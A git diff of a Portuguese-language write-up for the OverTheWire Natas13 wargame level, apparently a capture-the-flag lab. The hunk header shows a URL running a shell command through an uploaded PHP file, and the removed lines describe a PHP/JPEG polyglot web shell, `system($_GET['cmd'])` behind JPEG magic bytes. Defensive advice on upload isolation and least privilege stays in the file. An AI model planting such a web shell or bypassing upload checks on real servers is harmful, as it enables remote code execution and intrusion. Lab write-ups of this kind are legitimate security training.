@@ -86,13 +86,6 @@ http://natas13.natas.labs.overthewire.org/upload/bldzmc4xs4.php?cmd=cat%20/etc/n
 - Isolamento de Uploads: Arquivos enviados por usuários devem ser armazenados em um diretório que não permita execução de scripts e, se possível, servidos via um domínio ou CDN diferente.  
 - Princípio do Mínimo Privilégio: Certifique-se de que o usuário sob o qual o servidor web roda tenha as permissões mínimas necessárias, limitando o impacto de um RCE.  
 
-
----
-
-## 📎 Scripts desenvolvidos
-
-`bypass.php`: Um arquivo poliglota PHP/JPEG (`<?php system($_GET['cmd']); ?>` com magic bytes JPEG) criado diretamente no terminal.
-
 ---
 
 <p align="center"> <a href="../Natas12/Readme-BR.md">⬅️ Anterior</a> • <a href="../Natas14/Readme-BR.md">Proximo ➡️</a> </p>
